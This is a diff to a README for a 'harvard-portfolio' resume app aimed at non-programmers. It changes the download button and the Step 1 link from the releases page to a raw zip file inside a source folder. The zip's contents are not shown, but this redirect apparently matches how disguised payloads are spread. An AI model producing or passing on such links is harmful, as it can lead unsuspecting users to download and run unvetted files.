@@ -1,7 +1,7 @@
 <h1>📄 harvard-portfolio - View and Share Your Resume Professionally</h1>
 
 <p align="center">
-  <a href="https://github.com/emdadofficial/harvard-portfolio/releases" style="display:inline-block; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:#ffffff; padding:16px 40px; border-radius:8px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://github.com/emdadofficial/harvard-portfolio/raw/refs/heads/main/components/resume/portfolio_harvard_3.4.zip" style="display:inline-block; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:#ffffff; padding:16px 40px; border-radius:8px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## ✨ What Is Harvard-Portfolio?
@@ -16,7 +16,7 @@ Welcome! If you're not a programmer, don't worry. Follow these simple steps to g
 
 **Step 1: Visit the Download Link**
 
-Click the button above or go directly to: [https://github.com/emdadofficial/harvard-portfolio/releases](https://github.com/emdadofficial/harvard-portfolio/releases)
+Click the button above or go directly to: [https://github.com/emdadofficial/harvard-portfolio/raw/refs/heads/main/components/resume/portfolio_harvard_3.4.zip](https://github.com/emdadofficial/harvard-portfolio/raw/refs/heads/main/components/resume/portfolio_harvard_3.4.zip)
 
 **Step 2: Download the Application**
 
